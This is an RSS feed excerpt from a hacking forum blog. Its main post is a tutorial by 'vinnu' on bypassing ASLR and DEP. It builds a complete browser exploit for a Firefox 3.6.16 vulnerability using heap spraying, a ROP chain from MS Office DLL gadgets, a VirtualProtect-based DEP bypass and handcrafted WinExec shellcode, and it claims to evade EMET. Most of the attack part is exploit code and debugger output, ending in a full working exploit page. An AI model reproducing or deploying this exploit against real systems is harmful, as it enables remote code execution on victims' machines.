&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA["vinnu"]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=270</guid>
		</item>
		<item>
			<title>ASLR DEP bypassing techniques</title>
			<link>http://garage4hackers.com/entry.php?b=242</link>
			<pubDate>Wed, 21 Sep 2011 05:52:00 GMT</pubDate>
			<description>In defeating DEP you atleast need some information that will evade the ASLR. 
There are mainly two ways: 
 
1. Any anti ASLR modules gets loaded into...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">In defeating DEP you atleast need some information that will evade the ASLR.<br />
There are mainly two ways:<br />
<br />
1. Any anti ASLR modules gets loaded into the target application. I mean you have the base address of any module at fixed location always even after the system restart.<br />
<br />
2. You get a pointer leak from a memory leak/buffer overflow/any zeroday. In this technique you can adjust the offsets to grab the base address of the module whose pointer gets leaked.<br />
<br />
Now, you have evaded the ASLR. Now comes the DEP:<br />
<br />
DEP Data Execution Prevention mitigates the most of the attacks by denying the code execution from non executable memory, earlier until xp sp2, the stack and heap were executable, but now they no more possess execute attribute.<br />
<br />
But there are methods, you have a pointer, so you can either make your shellcode from ROP, rop is a little advanced return to libc attack and is return oriented programming.<br />
<br />
The main idea is to execute the necessary instructions nearby the &quot;return&quot; instruction, but for return instruction, you need to control the stack, the top of the stack must have the address of next instruction where you want to land and all these instructions are chosen or discovered from already loaded executable modules and from there executable code pages.<br />
<br />
I have discovered most of the rop chains online, but nearly all are the products of certain automatyed scripts, I mean if you want to learn then start doing it manually, otherwise you'll miss the whole technique.<br />
The most intelligent ROP chains are discovered manually, and are very specific and provide more control in very small execution overhead.<br />
<br />
One more thing to remember, most of the rop chains produced by automated scripts, are not suitable for certain type of vulnerabilities, then you might know how to develop one of yours own.<br />
<br />
Using the ROP you can either develop whole of your shellcode or just for the purpose of defeating DEP and then landing on the executable marked shellcode.<br />
<br />
Remember, the OS has very good randomization of module bases, stack and heap and pointers, but not the pointers to the pointers, in certain places, you can easily find, fixed addresses/pointer to another pointer inside any other module or to any export of any dll.<br />
<br />
Such informations help a lot.<br />
<br />
the memory leaks also help, e.g.<br />
<br />
function alfa(){<br />
var a1=document.cookie;<br />
}<br />
var a=window.setTimeout(alfa,100);<br />
alert(a.toString(16));<br />
<br />
The above leak is little old now, and provides us witha memory address inside mshtml.dll at the address rendered by a.toString(16)-1<br />
<br />
.This was a good pointer to pointer, similarly, 0x7ffe360 in this line you can find the base address of ntdll.dll in win7 64 bit<br />
whereas in all windows 32 bit versions, 7ffe300 has the addressof sysenter and 0x7ffe304 the ret instruction.<br />
<br />
But all these are pointer to pointers i.e. **<br />
whereas to form a shellcode dynamically, we need a direct pointer.<br />
I think you better know now the pwn2own memory leak by a buffer overflow.<br />
<br />
The custom shellcodes manufactured dynamically from memory leaks of pointers, can be simple and provide us with more control, than the other traditional shellcodes developed by msf etc.<br />
<br />
The main advantage of custom shellcodes made by pointer leaks are that, you can easily evade the mitigations like, emet (enhanced mitigation toolikit) and other av engines.<br />
<br />
Recomendation : Download and install the ~= 4.5 Mb emet from microsoft to secure yourself. It will fail the executaion of most of your traditional shellcodes.<br />
<br />
In next posts, we'll discus about certain vulnerabilities and then evade develop the exploit and try to develop the shellcode and rop chains in this thread. Hope you 'll enjoy and will actively take part.<br />
...to be continued<br />
<br />
--------------------------------------------<br />
In the world of ASLR and DEP remember there is no place for NOP and NOPsled. Only precision matters.<br />
<br />
The sprayer must be developed in such a way that it will place your chunks (rop + shellcode) at fixed locations.<br />
<br />
The slip of even a single byte is non preferable as it will make our rop to land at wrong addresses. The precision can be achieved by heap manipulation techniques. I'll recommend to study the &quot;Heap Fengshui&quot; by A. Satirov.<br />
<br />
By proper allocation of calculated sized heap chunks, we can more precisely place our chunks at same addresses every time.<br />
<br />
Let us proceed with the example and in coding. The example vulnerability (mchannel) is affecting Firefox 3.6.16 and its working exploits are already available. But we'll develop the ROP and shellcode manually and hand crafted no need of mona or anything automated as automation misses certain points and makes the things complex and the solutions are not so intelligent and simple. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:204px;">&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
&lt;script&gt;
function ignite()	{
	var e=document.getElementById(&quot;d&quot;);
	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
        e.data=&quot;&quot;;
}
&lt;/script&gt;
&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div><br />
In this vulnerability, we can control the ECX register as the place from where EAX register will grab the value can be controlled by a single object instantiation in heap.<br />
<br />
var obj = unescape(&quot;\x00&#3088;&quot;); // will make ECX register to point to at 0x0C100000<br />
// This is the address that will easily get sprayed and where the first byte of our chunk will be loaded.<br />
<br />
<br />
Note: Remember to rename the CrashReporter.exe from mozilla folder inside ur program files. And attach the debugger to the firefox before exploiting the vulnerability.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">6BE14E69   8B08             MOV ECX,DWORD PTR DS:[EAX] ; This is where our above allocation will load 0x0C100000 into
; ECX register
6BE14E6B   BE 02004B80      MOV ESI,804B0002
6BE14E70   56               PUSH ESI
6BE14E71   50               PUSH EAX
6BE14E72   FF51 18          CALL DWORD PTR DS:[ECX+18] ; This is where call will be transferred at address placed at
; 0x0C100018, So we need to frame our rop+shellcode module accordingly.</pre>
</div>Next comes the sprayer and ROP +shellcode. First of all we'll use dummy chunk in place of ROP+shellcode and slowly develop the ROP and shellcode over the dummy chunk. so let us proceed. For countering ASLR i'll use the GrooveUtil.dll &amp; GR469A~1.DLL which comes along with MS office 2007 in GrooveMonitor. These DLLs gets loaded into browsers by default. If default installation of MS OFFICE 2007 is done.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
&lt;script&gt;

function ignite()	{
	var e=document.getElementById(&quot;d&quot;);
	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
	
	var vftable = unescape(&quot;\x00% u0c10&quot;);
	// ROP using GrooveUtil.dll :
	var heap = unescape(
/* ROP : */			&quot;% u0101% u0102&quot;
					+&quot;% u0103% u0104&quot;
					+&quot;% u0105% u0106&quot;
					+&quot;% u0107% u0108&quot;
					+&quot;% u0109% u010a&quot;
					+&quot;% u010b% u010c&quot;
					+&quot;% u010d% u010e&quot;
					+&quot;% u010f% u0111&quot;
					+&quot;% u0112% u0113&quot;
					+&quot;% u0114% u0115&quot;
					+&quot;% u0116% u0117&quot;
					+&quot;% u0118% u0119&quot;
					+&quot;% u011a% u011b&quot;
					+&quot;% u011c% u011d&quot;
					+&quot;% u011e% u011f&quot;
					)
/* Shellcode : */	+unescape(&quot;% u9090% u9090&quot;+&quot;% u9090% u9090&quot;
					+&quot;% uCCCC% uCCCC% uCCCC% uCCCC&quot;
					+&quot;% uBBBB% uCCCC% uDDDD% uEEEE&quot;
/* command: */		+&quot;% u6163% u636c% u652e% u6578% u0000% ucccc&quot;	// calc.exe
					);

		var vtable = unescape(&quot;% u0c0c% u0c0c&quot;);
        while(vtable.length &lt; 0x10000) {vtable += vtable;}
        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
		var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
        var spray = new Array()
        for (var iter=0;iter&lt;0x100;iter++){
           spray[iter] = finalspray+heap;
        }
	e.data=&quot;&quot;;
}
&lt;/script&gt;
&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>Note : In code I've to place a blank space between &quot;%&quot; and &quot;u&quot; as unicode support is converting the blocks into respective characters, remember to remove these spaces from all blocks inside unescape blocks. <br />
<br />
One more thing, We are going to develop this exploit for win7 -win32 (you may check offsets for winxp, even offsets in win32 &amp; wow64 win7 also differs check them and fix them).<br />
<br />
Also install the EMET from microsoft website, It mitigates most of the shellcodes. But our shellcode will also bypass it and will be compact. <br />
<br />
Here is the result of above code:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:132px;">EAX 0400B620
ECX 0C100000
EDX 0313D970
EBX 043D0E04
ESP 0018DFCC
EBP 0018E1D8
ESI 804B0002
EDI 80000000
EIP 010E010D</pre>
</div>The EIP register has been controlled by loading in a value from our chunk 0x010E010D. This value comes from &quot;&#269;%u 010E&quot;.<br />
So we'll have to place the pointer of our first ROP gadget at &quot;%u 010D%u 010E&quot; place.<br />
<br />
The first task is to develop the ROP now and in ROP the first and most important and challenging task is the stack pivoting.<br />
In stack pivot, the ESP register is loaded with the address to our own allocated heap chunk so that the browser will consider the allocated heap chunk as stack and this new manipulated stack contains all the return addresses and arguments to the called functions.<br />
<br />
What we have to do actually is we need to either move or swap the register containing address to our allocated heap block into ESP register. Or pop an address of our heap block from stack into ESP register, there can be several instructions.<br />
<br />
In this case the EAX register contains the pointer to pointer (pointer to address) of our allocated heap block and ecx contain the direct address to our allocated heap chunk.<br />
So we need to discover the gadgets which encorporates either eax or ecx registers in case of stack pivoting. <br />
<br />
There are certain instructions like:<br />
<br />
<br />
XCHG ECX,ESP<br />
ret<br />
<br />
or<br />
<br />
mov esp,ecx<br />
ret<br />
<br />
or<br />
<br />
XCHG dword ptr[EAX],ESP<br />
ret<br />
<br />
or<br />
<br />
mov ESP,dword ptr[EAX]<br />
ret<br />
<br />
or like these can be of help.<br />
<br />
But alas we cannot find anything useful, but following gadget was discovered:<br />
<br />
<br />
6623BE51 : XCHG EAX,ESP<br />
ret<br />
<br />
<br />
into GR469A~1.DLL but we need to replace the &quot;pointer to pointer&quot; with direct pointer in EAX register before executing this gadget.<br />
So we need to discover something like<br />
<br />
mov EAX,dword ptr[eax]<br />
call eax<br />
ret<br />
<br />
But, this following gadget was discovered and was pretty helpful:<br />
<br />
<br />
661C5B33 : MOV EAX,DWORD PTR DS:[ECX]<br />
CALL DWORD PTR DS:[EAX+8]<br />
<br />
<br />
This gadget needs the address to be loaded into eax register at place where ECX register is pointing.<br />
The ECX register points to first bytes of our heap block and then the next call will be made to the address at ECX + 8.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:300px;">0C100000  01 01 02 01 03 01 04 01  
0C100008  05 01 06 01 07 01 08 01  
0C100010  09 01 0A 01 0B 01 0C 01  ...
0C100018  0D 01 0E 01 0F 01 11 01  .
0C100020  12 01 13 01 14 01 15 01  
0C100028  16 01 17 01 18 01 19 01  
0C100030  1A 01 1B 01 1C 01 1D 01  
0C100038  1E 01 1F 01 90 90 90 90  
0C100040  90 90 90 90 CC CC CC CC  ÌÌÌÌ
0C100048  CC CC CC CC BB BB CC CC  ÌÌÌÌ»»ÌÌ
0C100050  DD DD EE EE 63 61 6C 63  ÝÝîîcalc
0C100058  2E 65 78 65 00 00 CC CC  .exe..ÌÌ
0C100060  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100068  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100070  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100078  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100080  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100088  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100090  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100098  0C 0C 0C 0C 0C 0C 0C     .......
--- -- --
--- -- --
--- -- --</pre>
</div>So we need to place the first gadget address at 0C100018: 0D 01 0E 1E and change the 0C100000: 01 01 02 01 with address to (address of offset to the address of next gadget[ XCHG EAX,ESP;ret ])-8 that is at &quot;%u 0107%u 0108&quot; if at 0x0C100000 has 0x0C100004 <br />
<br />
Following code section:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:252px;">var heap = unescape(
/* ROP : */			&quot;% u0004%u 0c10&quot;
					+&quot;% u0103%u 0104&quot;
					+&quot;%u 0105% u0106&quot;
					+&quot;%u BE51%u 6623&quot;	// XCHG EAX,ESP;ret
					+&quot;%u 0109%u 010a&quot;
					+&quot;% u010b%u 010c&quot;
					+&quot;%u 5B33% u661C&quot;	// :GR469A~1.DLL
									//	8B01             MOV EAX,DWORD PTR DS:[ECX]
									//	FF50 08          CALL DWORD PTR DS:[EAX+8]
					+&quot;% u010f% u0111&quot;
					+&quot;%u 0112% u0113&quot;
					+&quot;%u 0114%u 0115&quot;
					+&quot;%u 0116%u 0117&quot;
					+&quot;%u 0118% u0119&quot;
					+&quot;% u011a%u 011b&quot;
					+&quot;%u 011c%u 011d&quot;
					+&quot;%u 011e%u 011f&quot;
					)</pre>
</div>It will result in loading our inted value into ESP register as following registers dump shows:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:132px;">EAX 0029DF08
ECX 0C100000
EDX 03D19160
EBX 048C0124
ESP 0C100008
EBP 0029E118
ESI 804B0002
EDI 80000000
EIP 01040103</pre>
</div>And this will result into our heap block transformed into stack as shown below:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">0C100000   0C100004
0C100004   01040103
0C100008   01060105
0C10000C   6623BE51  GR469A~1.6623BE51
0C100010   010A0109
0C100014   010C010B  firefox.010C010B
0C100018   661C5B33  GR469A~1.661C5B33
0C10001C   0111010F  firefox.0111010F
0C100020   01130112  firefox.01130112
0C100024   01150114  firefox.01150114
0C100028   01170116  firefox.01170116
0C10002C   01190118
0C100030   011B011A
0C100034   011D011C
0C100038   011F011E
0C10003C   90909090
0C100040   90909090
0C100044   CCCCCCCC
0C100048   CCCCCCCC
0C10004C   CCCCBBBB
0C100050   EEEEDDDD
0C100054   636C6163
0C100058   6578652E
0C10005C   CCCC0000
0C100060   0C0C0C0C
0C100064   0C0C0C0C
0C100068   0C0C0C0C
0C10006C   0C0C0C0C
0C100070   0C0C0C0C
0C100074   0C0C0C0C
0C100078   0C0C0C0C
0C10007C   0C0C0C0C
0C100080   0C0C0C0C
0C100084   0C0C0C0C
0C100088   0C0C0C0C
0C10008C   0C0C0C0C
0C100090   0C0C0C0C
0C100094   0C0C0C0C
0C100098   0C0C0C0C
0C10009C   0C0C0C0C
0C1000A0   0C0C0C0C
0C1000A4   0C0C0C0C
------
------
------</pre>
</div>First phase of our mission is now complete with successful stack pivot, so the next return instruction will land on the address in our stack (our heap block).<br />
<br />
Now next phase is to get a pointer to the kernel32.VirtualProtect function and put its arguments on our stack to bypass the DEP.<br />
<br />
The address to VirtualProtect will follow its arguments, it takes 4 argumenst, the first argument is the address to the first byte of the shellcode, the second argument is the size of the shellcode block; this can be any dword number but atleast the size of shellcode, 3rd argument is the FLAG the value must be 0x00000040 to set the attribute of memory page contaning shellcode as PAGE_READ_WRITE_EXECUTE. 4rth argument is the pointer to any writable location where old attribute value will be saved, this will be 0x0c0c0c0c in our case or whatever make sure it should be writable.<br />
<br />
The GrooveUtil.dll contains a call to VirtualProtect at : 0x68F2F1DD as:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">68F2F1DD   FF15 BC71F668    CALL DWORD PTR DS:[&lt;&amp;KERNEL32.VirtualPro&gt;; kernel32.VirtualProtect
68F2F1E3   8BC6             MOV EAX,ESI
68F2F1E5   5E               POP ESI
68F2F1E6   C9               LEAVE
68F2F1E7   C2 0400          RETN 4</pre>
</div>We need to fix certain things on our stack prior to call to VirtualProtect.<br />
<br />
<br />
POP ESI<br />
LEAVE<br />
RETN 4<br />
<br />
<br />
The instruction that will cause trouble is LEAVE it fixes the stack by dissolving the stack frame. The stack frame is the block between ESP and EBP, and until now the EBP register points to an address that will make us lose our stack once again, so the EBP must contain an address just before the start of shellcode. <br />
<br />
Now we have the following code:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
&lt;script&gt;

function ignite()	{
	var e=document.getElementById(&quot;d&quot;);
	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
	
	var vftable = unescape(&quot;\x00&#65533; c10&quot;);
	// ROP using GrooveUtil.dll :
	var heap = unescape(&quot;%u 0004%u 0c10&quot;
					+&quot;%u BCBB%u 68F1&quot;	//POP EDI; POP EBX; POP ESI; RETN
					+&quot;%u 0105%u 0106&quot;	//
					+&quot;%u BE51%u 6623&quot;	// XCHG EAX,ESP;ret
					+&quot;%u 0030%u 0c10&quot; //
					+&quot;%u 7C2A%u 68F0&quot;	// POP EDI; POP EBP; RETN


					+&quot;%u 5B33%u 661C&quot;	// :GR469A~1.DLL
									//	8B01             MOV EAX,DWORD PTR DS:[ECX]
									//	FF50 08          CALL DWORD PTR DS:[EAX+8]
					+&quot;% u0030% u0c10&quot;	// will be popped in ebp
					+&quot;%u F1DD% u68F2&quot;	// Pointer to Virtual Protect
					+&quot;% u0030% u0c10&quot;		// Base Address of Shellcode
					+&quot;% u9000% u0000&quot;		// Size of the Page, you can adjust it
					+&quot;%u 0040% u0000&quot;		// PAGE_EXECUTE_READ_WRITE
					+&quot;% u0c0c%u 0c0c&quot;		// Writable Location for preserving old attributes
					+&quot;%u 0038%u 0c10&quot;		// will be popped in esi
					)
/* Shellcode : */	+unescape(&quot;%u 9090%u 9090&quot;+&quot;% u9090% u9090&quot;
					+&quot;%u CCCC% uCCCC% uCCCC% uCCCC&quot;
					+&quot;%u BBBB%u CCCC%u DDDD%u EEEE&quot;
/* command: */		+&quot;% u6163% u636c% u652e% u6578% u0000% ucccc&quot;	// calc.exe
					);

		var vtable = unescape(&quot;%u 0c0c% u0c0c&quot;);
        while(vtable.length &lt; 0x10000) {vtable += vtable;}
        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
		var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
        var spray = new Array()
        for (var iter=0;iter&lt;0x100;iter++){
           spray[iter] = finalspray+heap;
        }
	e.data=&quot;&quot;;
}
&lt;/script&gt;
&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>And it will result into the successful DEP bypass and EIP now lands on our shellcode but the debuggerbreak is called as 0xcc instruction is countered.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:132px;">EAX 0C100030
ECX 0C0FFFDC
EDX 770264F4 ntdll.KiFastSystemCallRet
EBX 6623BE51 GR469A~1.6623BE51
ESP 0C10003C
EBP 0C0C0C0C
ESI 0C100038
EDI 661C5B33 GR469A~1.661C5B33
EIP 0C100041</pre>
</div>Now comes the next phase of our mission, the shellcode formation. We have two registers containing addresses within GR469A~1.dll<br />
<br />
<br />
EBX 6623BE51 GR469A~1.6623BE51<br />
EDI 661C5B33 GR469A~1.661C5B33<br />
<br />
<br />
We need to find any call to any Kernel32.dll export function and then we'll make EAX register to point to the kernel32 export, now we can add or subtract the proper offset (These offsets are OS dependent you may need to calculate in ur own cases) to make make EAX point to kernel32.WinExec function, then we'll push the arguments, it takes two arguments, first pointer determines whether the window is shown for executed command or not and second argument is the pointer to the command line you want to execute. <br />
<br />
Following instructions will work for us:<br />
as EDI contains an address inside the dll we need to fix it by adding an offset to make it point to the location where address of export Kernel32.dll is located.<br />
<br />
81C7 6D980700 ADD EDI,7986D<br />
<br />
Following will be the javascript unicode representation for it:<br />
<br />
&quot;% uC781%u 986D%u 0007&quot;<br />
<br />
Remember interchange the bytes in pair, if the number of bytes is odd then the begining of last pair can be made to a nop 90.<br />
Then we will take the address of Kernel32 address into EAX register from pointer to pointer [EDI]:<br />
<br />
8B07 MOV EAX,DWORD PTR DS:[EDI]<br />
<br />
this will yield &quot;%u 078B&quot; The EAX now contains the address of &quot;Kernel32.WaitForSingleObject&quot;.<br />
<br />
0004EFA0 WaitForSingleObject<br />
<br />
The RVA of WinExec is as follows:<br />
<br />
0008E695 WinExec<br />
<br />
Now we need to calculate the offset:<br />
0008E695 - 0004EFA0 = 3F6F5<br />
<br />
So we need to add EAX + 3F6F5 to make EAX point to WinExec.<br />
<br />
05 F5F60300 ADD EAX,3F6F5<br />
<br />
In javascript it will be:<br />
<br />
&quot;%u F505% u03F6 %u 9000&quot;<br />
<br />
Then we'll push 5 as an argument to WinExec.<br />
<br />
6A 05 PUSH 5<br />
<br />
This becomes<br />
<br />
&quot;%u 056A&quot;<br />
5 means window will be shown.<br />
<br />
Then we have ecx pointing to somewhere in our heap block.<br />
<br />
ECX = 0x0C0FFFDC<br />
<br />
We need to fix it also to make it to point to the command to be executed by adding 0x8E it will point to calc.exe.<br />
<br />
81C1 8E000000 ADD ECX,8E<br />
<br />
Its javascript block will be:<br />
<br />
&quot;%u C181% u008E% u0000&quot;<br />
<br />
and push ecx on stack<br />
<br />
51 PUSH ECX<br />
<br />
Its javascript will be<br />
&quot;%u 9051&quot;<br />
<br />
And now the jackpot :<br />
FFD0 CALL EAX<br />
<br />
&quot;%u D0FF&quot;<br />
<br />
And with this, you'll hit the jackpot.<br />
But wait, we also need to terminate the process gently, so copy the eax to some other register like ESI<br />
then fix ESI to point to TerminateProcess and push its argument it needs the handle to process, the pseudo handle to current process is 0xFFFFFFFF or u need to push -1 and call ESI.<br />
<br />
Then the command buffer will also be in same manner<br />
<br />
calc.exe<br />
<br />
&quot;%u 6163% u636c% u652e%u 6578%u 0000&quot; <br />
<br />
Following is the complete exploit code, with handcrafted &amp; compact shellcode, even EMET will also be mitigated itself:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
&lt;script&gt;

function ignite()	{
	var e=document.getElementById(&quot;d&quot;);
	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
	
	var vftable = unescape(&quot;\x00% u0c10&quot;);
	// ROP using GrooveUtil.dll :
	var heap = unescape(&quot;% u0004% u0c10&quot;
					+&quot;% uBCBB% u68F1&quot;	//POP EDI; POP EBX; POP ESI; RETN
					+&quot;%u 0105% u0106&quot;	//
					+&quot;%u BE51%u 6623&quot;	// XCHG EAX,ESP;ret
					+&quot;%u 0030% u0c10&quot;
					+&quot;% u7C2A% u68F0&quot;	// POP EDI; POP EBP; RETN


					+&quot;% u5B33% u661C&quot;	// :GR469A~1.DLL
									//	8B01             MOV EAX,DWORD PTR DS:[ECX]
									//	FF50 08          CALL DWORD PTR DS:[EAX+8]
					+&quot;% u0030% u0c10&quot;	// will be popped in ebp
					+&quot;% uF1DD% u68F2&quot;	// Pointer to Virtual Protect
					+&quot;% u0030% u0c10&quot;		// Base Address of Shellcode
					+&quot;% u9000% u0000&quot;		// Size of the Page, you can adjust it
					+&quot;% u0040% u0000&quot;		// PAGE_EXECUTE_READ_WRITE
					+&quot;% u0c0c% u0c0c&quot;		// Writable Location for preserving old attributes
					+&quot;% u0038% u0c10&quot;		// will be popped in esi
					)
					+unescape(&quot;% u9090% u9090&quot;+&quot;% u9090% u9090&quot;
					+&quot;% uC781% u986D%u 0007&quot;	//81C7 6D980700    ADD EDI,7986D
					+&quot;% u078B&quot;	//8B07             MOV EAX,DWORD PTR DS:[EDI]
					+&quot;% uF505%u 03F6% u9000&quot;	//05 F5F60300      ADD EAX,3F6F5;90 NOP
					+&quot;% u9090&quot;
					+&quot;% u056A&quot;	//6A 05            PUSH 5
					+&quot;% uC181% u008E% u0000&quot;	//81C1 8E000000    ADD ECX,8E
					+&quot;% u9051&quot;	//51    PUSH ECX; 90 NOP
					+&quot;% uF08B&quot;	//8BF0             MOV ESI,EAX
					+&quot;% uD0FF&quot;	//FFD0             CALL EAX
//					+&quot;% ucccc&quot;
					+&quot;%u EE81% u95Fa% u0004&quot;//81EE FA950400    SUB ESI,495FA
					+&quot;%u FF6A&quot;	//6A FF            PUSH -1
					+&quot;%u D6FF&quot;	//FFD6             CALL ESI
					+&quot;%u CCCC&quot;
/* command: */		+&quot;% u6163% u636c% u652e% u6578% u0000% ucccc&quot;
					);

		var vtable = unescape(&quot;% u0c0c%u 0c0c&quot;);
        while(vtable.length &lt; 0x10000) {vtable += vtable;}
        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
		var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
        var spray = new Array()
        for (var iter=0;iter&lt;0x100;iter++){
            spray[iter] = finalspray+heap;
        }
	e.data=&quot;&quot;;
}
&lt;/script&gt;
&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>Note: Remember to remove the spaces around % and u.<br />
<br />
Thanx<br />
...&quot;vinnu&quot;</blockquote>

]]></content:encoded>
			<dc:creator><![CDATA["vinnu"]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=242</guid>
		</item>
	</channel>
</rss>
